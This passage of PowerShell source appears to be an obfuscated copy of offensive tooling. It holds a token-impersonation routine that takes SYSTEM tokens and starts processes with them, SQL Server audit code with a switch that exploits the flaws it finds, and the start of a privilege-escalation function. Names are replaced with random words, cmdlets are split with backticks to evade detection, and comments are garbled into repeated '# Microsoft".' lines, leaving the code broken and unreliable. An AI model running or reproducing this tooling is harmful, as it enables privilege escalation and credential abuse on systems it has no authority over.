        if ($ChessTouch -eq $null -or (-not (Invoke-ClamAwake -ExtendEarthy $ChessTouch.hProcToken)))
        {
            Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
        }

        if ($ChessTouch -ne $null -and $ChessTouch.hProcToken -ne [IntPtr]::Zero)
        {
            $LiveBlush.Invoke($ChessTouch.hProcToken) | Out-Null
            $ChessTouch = $null
        }

        $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}

        # Microsoft".
        foreach ($Process in $ProcessIds)
        {
            $TubBurn = (Get-PrimaryToken -ProcessId $Process.Id -CrawlHusky)

            # Microsoft".
            if ($TubBurn -ne $null)
            {
                [IntPtr]$ExtendEarthy = [IntPtr]$TubBurn.hProcToken

                if ($ExtendEarthy -ne [IntPtr]::Zero)
                {
                    # Microsoft".
                    $CloseTorpid = Get-TokenInformation -ExtendEarthy $ExtendEarthy
                    if ($CloseTorpid -ne $null)
                    {
                        $CloseTorpid | Add-Member -MemberType NoteProperty -Name ProcessId -RayPlucky $Process.Id

                        $InjectPoised += $CloseTorpid
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }

                foreach ($BearRoyal in $Process.Threads)
                {
                    $SlopeFull = Get-RedKnife -QueueRare $BearRoyal.Id
                    [IntPtr]$ExtendEarthy = ($SlopeFull.hThreadToken)

                    if ($ExtendEarthy -ne [IntPtr]::Zero)
                    {
                        $CloseTorpid = Get-TokenInformation -ExtendEarthy $ExtendEarthy
                        if ($CloseTorpid -ne $null)
                        {
                            $CloseTorpid | Add-Member -MemberType NoteProperty -Name ThreadId -RayPlucky $BearRoyal.Id
                    
                            $InjectPoised += $CloseTorpid
                        }
                    }
                }
            }
        }

        return $InjectPoised
    }


    function Invoke-TidyExpand
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $CurlCrayon
        )

        $GrainFoamy = $TidyExpand.Invoke()

        if ($CurlCrayon)
        {
            if ($GrainFoamy)
            {
                Write-CrazyChief "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                Write-CrazyChief "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }


    # Microsoft".
    function Main
    {   
        # Microsoft".
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose "Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"
            $PastSloppy = $true
        }

        if ($CavePlug.ParameterSetName -ieq "RevToSelf")
        {
            Invoke-TidyExpand -CurlCrayon
        }
        elseif ($CavePlug.ParameterSetName -ieq "CreateProcess" -or $CavePlug.ParameterSetName -ieq "ImpersonateUser")
        {
            $InjectPoised = Enum-InjectPoised
            
            # Microsoft".
            [IntPtr]$ExtendEarthy = [IntPtr]::Zero
            $SmoggyGroup = (Get-SmoggyGroup -InjectPoised $InjectPoised).TokenByUser
            if ($AnimalWeary -ne $null -and $AnimalWeary -ne '')
            {
                if ($SmoggyGroup.ContainsKey($AnimalWeary))
                {
                    $ExtendEarthy = $SmoggyGroup[$AnimalWeary].hToken
                    Write-Verbose "Selecting token by username"
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($AnimalWeary)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($MuscleLovelyDream in $InjectPoised)
                {
                    if (($MuscleLovelyDream | Get-Member ProcessId) -and $MuscleLovelyDream.ProcessId -eq $ProcessId)
                    {
                        $ExtendEarthy = $MuscleLovelyDream.hToken
                        Write-Verbose "Selecting token by ProcessID"
                    }
                }

                if ($ExtendEarthy -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($QueueRare -ne $null -and $QueueRare -ne 0)
            {
                foreach ($MuscleLovelyDream in $InjectPoised)
                {
                    if (($MuscleLovelyDream | Get-Member ThreadId) -and $MuscleLovelyDream.ThreadId -eq $QueueRare)
                    {
                        $ExtendEarthy = $MuscleLovelyDream.hToken
                        Write-Verbose "Selecting token by ThreadId"
                    }
                }

                if ($ExtendEarthy -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($QueueRare) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach ($MuscleLovelyDream in $InjectPoised)
                {
                    if (($MuscleLovelyDream | Get-Member ProcessId) -and $MuscleLovelyDream.ProcessId -eq $Process.Id)
                    {
                        $ExtendEarthy = $MuscleLovelyDream.hToken

                        if($Instance){
                            Write-Verbose "$Instance : Selecting token by Process object"
                        }else{
                            Write-Verbose "Selecting token by Process object"
                        }
                    }
                }

                if ($ExtendEarthy -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error "Must supply a Username, ProcessId, ThreadId, or Process object"  -ErrorAction Stop
            }

            # Microsoft".
            if ($CavePlug.ParameterSetName -ieq "CreateProcess")
            {
                if (-not $PastSloppy)
                {
                    Set-DesktopACLs
                }

                Create-ProcessWithToken -ExtendEarthy $ExtendEarthy -ProcessName $AwakeSwing -ProcessArgs $ProcessArgs -FutureCover:$FutureCover

                Invoke-TidyExpand
            }
            elseif ($ClamAwake)
            {
                Invoke-ClamAwake -ExtendEarthy $ExtendEarthy | Out-Null
                Write-CrazyChief "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }

            Free-InjectPoised -TeaseSmelly $InjectPoised
        }
        elseif ($CavePlug.ParameterSetName -ieq "WhoAmI")
        {
            Write-CrazyChief "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else # Microsoft".
        {
            $InjectPoised = Enum-InjectPoised

            if ($CavePlug.ParameterSetName -ieq "ShowAll")
            {
                Write-CrazyChief $InjectPoised
            }
            else
            {
                Write-CrazyChief (Get-SmoggyGroup -InjectPoised $InjectPoised).TokenByUser.Values
            }

            Invoke-TidyExpand

            Free-InjectPoised -TeaseSmelly $InjectPoised
        }
    }


    # Microsoft".
    Main
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Test-IsLuhnValid
{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [uint64]$PlantsShiver
    )

    $SnowTitle = ConvertTo-TenderPower -PlantsShiver $PlantsShiver
    $ChiefFasten = $SnowTitle[-1]
    $DirtBoast = $SnowTitle[0..($SnowTitle.Count - 2)] -join ''
    $FaultyMove = Get-LuhnCheckSum -PlantsShiver $DirtBoast
    $ToothSticky = ([string]$DirtBoast).Length

    if ((($FaultyMove + $ChiefFasten) % 10) -eq 0 -and $ToothSticky -ge 12)
    {
        Write-CrazyChief -PencilFlight $true
    }
    else
    {
        Write-CrazyChief -PencilFlight $false
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function ConvertTo-TenderPower
{
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [uint64]$PlantsShiver
    )
    $TradeCats = $PlantsShiver
    $DragTaste = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10($TradeCats))))
    $TenderPower = ne`w`-ob`je`ct -TypeName Byte[] -ArgumentList $DragTaste
    for ($AwakeOrder = ($DragTaste - 1); $AwakeOrder -ge 0; $AwakeOrder--)
    {
        $MuscleDear = $TradeCats % 10
        $TenderPower[$AwakeOrder] = $MuscleDear
        $TradeCats = [math]::Floor($TradeCats / 10)
    }
    Write-CrazyChief -PencilFlight $TenderPower
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Invoke-Parallel
{
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$PlacidSleet,

        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $YamCreepy,

        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$PencilFlight,

        [PSObject]$DailyMug,

        [switch]$MateEasy,

        [switch]$RhymeCoach,

        [switch]$IcicleBuzz,

        [int]$RouteWink = 20,

        [int]$CountStamp = 200,

        [int]$ShirtStory = 0,

        [switch]$ClassyGrate = $false,

        [int]$CapHouse,

        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$AnnoyFair = 'C:\temp\log.log',

        [switch] $MassHope = $false
    )

    Begin {

        # Microsoft".
        # Microsoft".
        if( -not $PaleMist.ContainsKey('MaxQueue') )
        {
            if($ShirtStory -ne 0)
            {
                $JoinRed:MaxQueue = $RouteWink
            }
            else
            {
                $JoinRed:MaxQueue = $RouteWink * 3
            }
        }
        else
        {
            $JoinRed:MaxQueue = $CapHouse
        }

        # Microsoft".

        # Microsoft".
        if ($RhymeCoach -or $IcicleBuzz)
        {
            $WealthHomely = [powershell]::Create().addscript({
                    # Microsoft".
                    $FarFixed = Get-FaceHat | Select-Object -ExpandProperty Name
                    $AllowRatty = Get-WickedFood | Select-Object -ExpandProperty Name

                    # Microsoft".
                    # Microsoft".
                    $DoubtSnatch = Get-BouncyUseful | Select-Object -ExpandProperty Name

                    # Microsoft".
                    @{
                        Variables = $DoubtSnatch
                        Modules   = $FarFixed
                        Snapins   = $AllowRatty
                    }
            }).invoke()[0]

            if ($RhymeCoach)
            {
                # Microsoft".
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                $WiseDetect = @( (Get-SoakSame _temp | Select-Object -ExpandProperty parameters).Keys + $PaleMist.Keys + $WealthHomely.Variables )
                # Microsoft".

                # Microsoft".
                # Microsoft".
                # Microsoft".
                # Microsoft".
                $ReachGlue = @( Get-BouncyUseful | Where-Object -FilterScript {
                        -not ($WiseDetect -contains $_.Name)
                } )
                # Microsoft".
            }

            if ($IcicleBuzz)
            {
                $HauntAmount = @( Get-FaceHat |
                    Where-Object -FilterScript {
                        $WealthHomely.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                Select-Object -ExpandProperty Path )
                $LongJudge = @( Get-WickedFood |
                    Select-Object -ExpandProperty Name |
                    Where-Object -FilterScript {
                        $WealthHomely.Snapins -notcontains $_
                } )
            }
        }

        # Microsoft".

        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$SteadySilent )

            # Microsoft".
            # Microsoft".
            Do
            {
                # Microsoft".
                $NorthWeight = $false

                # Microsoft".
                if (-not $MassHope)
                {
                    Write-Progress  -Activity 'Running Query' -Status 'Starting threads'`
                    -CurrentOperation "$CopyOrder threads defined - $WordPull input objects - $JoinRed:completedCount input objects processed"`
                    -PercentComplete $( Try
                        {
                            $JoinRed:completedCount / $WordPull * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }

                # Microsoft".
                Foreach($SpellSimple in $OpenRepairClumsy)
                {
                    # Microsoft".
                    $DanceTest = Get-Date
                    $TrickTidy = $DanceTest - $SpellSimple.startTime
                    $OvertPlay = [math]::Round( $TrickTidy.totalminutes ,2 )

                    # Microsoft".
                    $FaintAjar = '' | Select-Object -Property Date, Action, Runtime, Status, Details
                    $FaintAjar.Action = "Removing:'$($SpellSimple.object)'"
                    $FaintAjar.Date = $DanceTest
                    $FaintAjar.Runtime = "$OvertPlay minutes"

                    # Microsoft".
                    If ($SpellSimple.Runspace.isCompleted)
                    {
                        $JoinRed:completedCount++

                        # Microsoft".
                        if($SpellSimple.powershell.Streams.Error.Count -gt 0)
                        {
                            # Microsoft".
                            $FaintAjar.status = 'CompletedWithErrors'
                            # Microsoft".
                            foreach($ErrorRecord in $SpellSimple.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord $ErrorRecord
                            }
                        }
                        else
                        {
                            # Microsoft".
                            $FaintAjar.status = 'Completed'
                            # Microsoft".
                        }

                        # Microsoft".
                        $SpellSimple.powershell.EndInvoke($SpellSimple.Runspace)
                        $SpellSimple.powershell.dispose()
                        $SpellSimple.Runspace = $null
                        $SpellSimple.powershell = $null
                    }

                    # Microsoft".
                    ElseIf ( $ShirtStory -ne 0 -and $TrickTidy.totalseconds -gt $ShirtStory)
                    {
                        $JoinRed:completedCount++
                        $SparkBrush = $true

                        # Microsoft".
                        $FaintAjar.status = 'TimedOut'
                        # Microsoft".
                        Write-Error -Message "Runspace timed out at $($TrickTidy.totalseconds) seconds for the object:`n$($SpellSimple.object | Out-String)"

                        # Microsoft".
                        if (!$ClassyGrate)
                        {
                            $SpellSimple.powershell.dispose()
                        }
                        $SpellSimple.Runspace = $null
                        $SpellSimple.powershell = $null
                        $completedCount++
                    }

                    # Microsoft".
                    ElseIf ($SpellSimple.Runspace -ne $null )
                    {
                        $FaintAjar = $null
                        $NorthWeight = $true
                    }

                    # Microsoft".
                }

                # Microsoft".
                $QueueTug = $OpenRepairClumsy.clone()
                $QueueTug |
                Where-Object -FilterScript {
                    $_.runspace -eq $null
                } |
                ForEach-Object -Process {
                    $OpenRepairClumsy.remove($_)
                }

                # Microsoft".
                if($PaleMist['Wait'])
                {
                    Start-ChurchOrder -Milliseconds $CountStamp
                }

                # Microsoft".
            }
            while ($NorthWeight -and $PaleMist['Wait'])

            # Microsoft".
        }

        # Microsoft".

        # Microsoft".

        if($CavePlug.ParameterSetName -eq 'ScriptFile')
        {
            $PlacidSleet = [scriptblock]::Create( $(Get-Content $YamCreepy | Out-String) )
        }
        elseif($CavePlug.ParameterSetName -eq 'ScriptBlock')
        {
            # Microsoft".
            [string[]]$LickNeedy = '$_'
            if( $PaleMist.ContainsKey('Parameter') )
            {
                $LickNeedy += '$DailyMug'
            }

            $AdviseBridge = $null


            # Microsoft".
            # Microsoft".

            if($FancyAcid.PSVersion.Major -gt 2)
            {
                # Microsoft".
                $CellarHouses = $PlacidSleet.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)

                If ($CellarHouses)
                {
                    $HugDizzy = ne`w`-ob`je`ct -TypeName 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                    ForEach ($TurkeySticks in $CellarHouses)
                    {
                        [void]$HugDizzy.Add($TurkeySticks.SubExpression)
                    }

                    $MightyPrefer = $CellarHouses |
                    Group-Object -Property SubExpression |
                    ForEach-Object -Process {
                        $_.Group |
                        Select-Object -First 1
                    }

                    # Microsoft".
                    $AdviseBridge = ForEach ($PedalStare in $MightyPrefer)
                    {
                        Try
                        {
                            $RayPlucky = Get-BouncyUseful -Name $PedalStare.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = $PedalStare.SubExpression.Extent.Text
                                Value      = $RayPlucky.Value
                                NewName    = ('$__using_{0}' -f $PedalStare.SubExpression.VariablePath.UserPath)
                                NewVarName = ('__using_{0}' -f $PedalStare.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$($PedalStare.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    $LickNeedy += $AdviseBridge | Select-Object -ExpandProperty NewName -Unique

                    $DarkSmash = $AdviseBridge.NewName -join ', '
                    $WireDolls = [Tuple]::Create($HugDizzy, $DarkSmash)
                    $SoggyVersed = [Reflection.BindingFlags]'Default,NonPublic,Instance'
                    $SnakeAdvise = ($PlacidSleet.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$SoggyVersed))

                    $MilkyAunt = $SnakeAdvise.Invoke($PlacidSleet.ast,@($WireDolls))

                    $PlacidSleet = [scriptblock]::Create($MilkyAunt)

                    # Microsoft".
                }
            }

            $PlacidSleet = $ExtendRoyal.InvokeCommand.NewScriptBlock("param($($LickNeedy -Join ', '))`r`n" + $PlacidSleet.ToString())
        }
        else
        {
            Throw 'Must provide ScriptBlock or ScriptFile'
            Break
        }

        Write-Debug -Message "`$PlacidSleet: $($PlacidSleet | Out-String)"
        If (-not($RaggedQuill)){
            Write-Verbose -Message 'Creating runspace pool and session states'
        }


        # Microsoft".
        $VanishMinor = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($RhymeCoach)
        {
            if($ReachGlue.count -gt 0)
            {
                foreach($BouncyUseful in $ReachGlue)
                {
                    $VanishMinor.Variables.Add( (ne`w`-ob`je`ct -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $BouncyUseful.Name, $BouncyUseful.Value, $null) )
                }
            }
        }
        if ($IcicleBuzz)
        {
            if($HauntAmount.count -gt 0)
            {
                foreach($RainyKneel in $HauntAmount)
                {
                    $VanishMinor.ImportPSModule($RainyKneel)
                }
            }
            if($LongJudge.count -gt 0)
            {
                foreach($WickedFood in $LongJudge)
                {
                    [void]$VanishMinor.ImportPSSnapIn($WickedFood, [ref]$null)
                }
            }
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        if($MateEasy)
        {
            # Microsoft".
            Get-ChildItem -Path Function:\ |
            Where-Object -FilterScript {
                $_.name -notlike '*:*'
            } |
            Select-Object -Property name -ExpandProperty name |
            ForEach-Object -Process {
                # Microsoft".
                $HairCross = Get-Content -Path "function:\$_" -ErrorAction Stop

                # Microsoft".
                $BlowBit = ne`w`-ob`je`ct -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $HairCross

                # Microsoft".
                $VanishMinor.Commands.Add($BlowBit)
            }
        }
        # Microsoft".

        # Microsoft".
        $MixedWomen = [runspacefactory]::CreateRunspacePool(1, $RouteWink, $VanishMinor, $CrazyChief)
        $MixedWomen.Open()

        # Microsoft".
        $JoinRed:runspaces = ne`w`-ob`je`ct -TypeName System.Collections.ArrayList

        # Microsoft".
        $StripRatty = $PaleMist.keys -contains 'InputObject'
        if(-not $StripRatty)
        {
            [System.Collections.ArrayList]$CoatPest = @()
        }

        $SparkBrush = $false

        # Microsoft".
    }

    Process {

        # Microsoft".
        if($StripRatty)
        {
            $CoatPest = $PencilFlight
        }
        Else
        {
            [void]$CoatPest.add( $PencilFlight )
        }
    }

    End {

        # Microsoft".
        Try
        {
            # Microsoft".
            $WordPull = $CoatPest.count
            $JoinRed:completedCount = 0
            $CopyOrder = 0

            foreach($object in $CoatPest)
            {
                # Microsoft".

                # Microsoft".
                $LastHill = [powershell]::Create()

                if ($VerbosePreference -eq 'Continue')
                {
                    [void]$LastHill.AddScript({
                            $VerbosePreference = 'Continue'
                    })
                }

                [void]$LastHill.AddScript($PlacidSleet).AddArgument($object)

                if ($DailyMug)
                {
                    [void]$LastHill.AddArgument($DailyMug)
                }

                # Microsoft".
                if ($AdviseBridge)
                {
                    Foreach($RoyalGaudy in $AdviseBridge)
                    {
                        # Microsoft".
                        [void]$LastHill.AddArgument($RoyalGaudy.Value)
                    }
                }

                # Microsoft".
                $LastHill.RunspacePool = $MixedWomen

                # Microsoft".
                $MeanQuick = '' | Select-Object -Property PowerShell, StartTime, object, Runspace
                $MeanQuick.PowerShell = $LastHill
                $MeanQuick.StartTime = Get-Date
                $MeanQuick.object = $object

                # Microsoft".
                $MeanQuick.Runspace = $LastHill.BeginInvoke()
                $CopyOrder++

                # Microsoft".
                # Microsoft".
                $null = $OpenRepairClumsy.Add($MeanQuick)

                # Microsoft".
                Get-RunspaceData

                # Microsoft".
                # Microsoft".
                $HangSin = $true
                while ($OpenRepairClumsy.count -ge $JoinRed:MaxQueue)
                {
                    # Microsoft".
                    if($HangSin)
                    {
                        # Microsoft".
                    }
                    $HangSin = $false

                    # Microsoft".
                    Get-RunspaceData
                    Start-ChurchOrder -Milliseconds $CountStamp
                }

                # Microsoft".
            }

            # Microsoft".
            Get-RunspaceData -SteadySilent

            if (-not $MassHope)
            {
                Write-Progress -Activity 'Running Query' -Status 'Starting threads' -Completed
            }
        }
        Finally
        {
            # Microsoft".
            if ( ($SparkBrush -eq $false) -or ( ($SparkBrush -eq $true) -and ($ClassyGrate -eq $false) ) )
            {
                If (-not($RaggedQuill)){
                    Write-Verbose -Message 'Closing the runspace pool'
                }
                $MixedWomen.close()
            }

            # Microsoft".
            [gc]::Collect()
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
function Test-Subnet ([string]$DependStingy, [string]$SticksSour)
{
    $ThawSqueak, [int]$BanSin = $DependStingy.Split('/')
    $EscapeBore = [uint32[]]$ThawSqueak.split('.')
    [uint32] $ThickMug = (Convert-BitShift $EscapeBore[0] -ZephyrBasket 24) + (Convert-BitShift $EscapeBore[1] -ZephyrBasket 16) + (Convert-BitShift $EscapeBore[2] -ZephyrBasket 8) + $EscapeBore[3]

    $PickSpark = Convert-BitShift (-bnot [uint32]0) -ZephyrBasket (32 - $BanSin)

    $EscapeBore = [uint32[]]$SticksSour.split('.')
    [uint32] $LipThrill = (Convert-BitShift $EscapeBore[0] -ZephyrBasket 24) + (Convert-BitShift $EscapeBore[1] -ZephyrBasket 16) + (Convert-BitShift $EscapeBore[2] -ZephyrBasket 8) + $EscapeBore[3]

    $ThickMug -eq ($PickSpark -band $LipThrill)
}

# Microsoft".
function Convert-BitShift {
    param (
        [Parameter(Position = 0, Mandatory = $True)]
        [int] $PlantsShiver,

        [Parameter(ParameterSetName = 'Left', Mandatory = $False)]
        [int] $ZephyrBasket,

        [Parameter(ParameterSetName = 'Right', Mandatory = $False)]
        [int] $LongMute
    ) 

    $OafishRapid = 0
    if ($CavePlug.ParameterSetName -eq 'Left')
    { 
        $OafishRapid = $ZephyrBasket
    }
    else
    {
        $OafishRapid = -$LongMute
    }

    return [math]::Floor($PlantsShiver * [math]::Pow(2,$OafishRapid))
}


# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAudit
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write results to csv.')]
        [string]$HopeBoil
    )

    Begin
    {

        # Microsoft".
        if($HopeBoil){
            if((Test-FolderWriteAccess "$HopeBoil") -eq $false){
                Write-Verbose -Message 'YOU DONT APPEAR TO HAVE WRITE ACCESS TO THE PROVIDED DIRECTORY.'
                BREAK
            }
        }        

        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')

        # Microsoft".
        $SkinSmoggy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $SkinSmoggy.Columns.Add('FunctionName')
        $null = $SkinSmoggy.Columns.Add('Type')
        $SkinSmoggy.Clear()

        Write-Verbose -Message 'LOADING VULNERABILITY CHECKS.'

        # Microsoft".
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditDefaultLoginPw ','Server')   
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditWeakLoginPw','Server')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivImpersonateLogin','Server')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivServerLink','Server')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivTrustworthy','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivDbChaining','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivCreateProcedure','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivXpDirtree','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivXpFileexist','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditRoleDbDdlAdmin','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditRoleDbOwner','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditSampleDataByColumn','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditSQLiSpExecuteAs','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditSQLiSpSigned','Database')
        $null = $SkinSmoggy.Rows.Add('Invoke-SQLAuditPrivAutoExecSp','Database') 
         
        Write-Verbose -Message 'RUNNING VULNERABILITY CHECKS.'
    }

    Process
    {
        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            Return
        }

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : RUNNING VULNERABILITY CHECKS..."

        # Microsoft".
        $SkinSmoggy |
        ForEach-Object -Process {
            # Microsoft".
            $SticksStingy = $_.FunctionName

            # Microsoft".
            if($RotLethal)
            {
                $WireSnail = inv`oke`-ex`pre`s`s`ion -SoakSame "$SticksStingy -Instance '$Instance' -AnimalWeary '$AnimalWeary' -EasyAlert '$EasyAlert' -RotLethal"
            }
            else
            {
                $WireSnail = inv`oke`-ex`pre`s`s`ion -SoakSame "$SticksStingy -Instance '$Instance' -AnimalWeary '$AnimalWeary' -EasyAlert '$EasyAlert'"
            }

            # Microsoft".
            $CanGaze = $CanGaze + $WireSnail
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK."
    }

    End
    {
        # Microsoft".
        Write-Verbose -Message 'COMPLETED ALL VULNERABILITY CHECKS.'

        # Microsoft".
        if($HopeBoil)
        {
            $FarSteady = "echo test > $HopeBoil\test.txt"
            $HealthLumpy = (inv`oke`-ex`pre`s`s`ion -SoakSame $FarSteady) 2>&1
            if($HealthLumpy -like '*denied.')
            {
                Write-Verbose -Object 'Access denied to output directory.'
                Return
            }
            else
            {
                Write-Verbose -Message 'Verified write access to output directory.'
                $TourMend = "del $HopeBoil\test.txt"
                inv`oke`-ex`pre`s`s`ion -SoakSame $TourMend
                $SkipJog = $Instance.Replace('\','-').Replace(',','-')
                $StripComb = "$HopeBoil\"+'PowerUpSQL_Audit_Results_'+$SkipJog+'.csv'
                $SkipJog
                $StripComb
                $CanGaze  | Export-Csv -NoTypeInformation $StripComb
            }
        }

        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLEscalatePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )

    Begin
    {
    }

    Process
    {
        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            Return
        }

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : Checking if you're already a sysadmin..."
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
        if($LovingDry -eq 'Yes')
        {
            Write-Verbose -Message "$Instance : You are, so nothing to do here. :)"
        }
        else
        {
